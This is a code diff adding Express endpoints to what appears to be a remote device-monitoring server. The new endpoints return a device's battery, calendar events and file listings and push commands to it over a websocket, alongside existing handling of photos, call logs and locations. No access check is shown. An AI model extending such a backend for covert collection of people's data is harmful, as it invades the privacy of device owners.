@@ -509,6 +509,71 @@ app.delete('/api/device/:deviceId', async (req, res) => {
   }
 });
 
+// ===== NEW FEATURE ENDPOINTS =====
+
+app.get('/api/device/:deviceId/battery', async (req, res) => {
+  try {
+    const { data, error } = await supabase
+      .from('battery_status')
+      .select('*')
+      .eq('device_id', req.params.deviceId)
+      .order('created_at', { ascending: false })
+      .limit(20);
+    if (error) throw error;
+    res.json(data);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.get('/api/device/:deviceId/calendar', async (req, res) => {
+  try {
+    const { data, error } = await supabase
+      .from('calendar_events')
+      .select('*')
+      .eq('device_id', req.params.deviceId)
+      .order('start_time', { ascending: false })
+      .limit(100);
+    if (error) throw error;
+    res.json(data);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.get('/api/device/:deviceId/files', async (req, res) => {
+  try {
+    const { data, error } = await supabase
+      .from('device_files')
+      .select('*')
+      .eq('device_id', req.params.deviceId)
+      .order('file_path', { ascending: true })
+      .limit(500);
+    if (error) throw error;
+    res.json(data);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/device/:deviceId/refresh-battery', async (req, res) => {
+  try {
+    const { device_id, command_type } = { device_id: req.params.deviceId, command_type: 'GET_BATTERY' };
+    const commandId = uuidv4();
+    await supabase.from('commands').insert({ id: commandId, device_id, command_type, status: 'pending' });
+    const device = connectedDevices.get(device_id);
+    if (device && device.ws.readyState === 1) {
+      device.ws.send(JSON.stringify({ command_type, command_id: commandId, payload: '' }));
+      res.json({ status: 'sent' });
+    } else {
+      await supabase.from('commands').update({ status: 'device_offline' }).eq('id', commandId);
+      res.json({ status: 'device_offline' });
+    }
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
 app.get('/api/stats', async (req, res) => {
   try {
     const [devices, photos, callLogs, locations, commands, notifications] = await Promise.all([
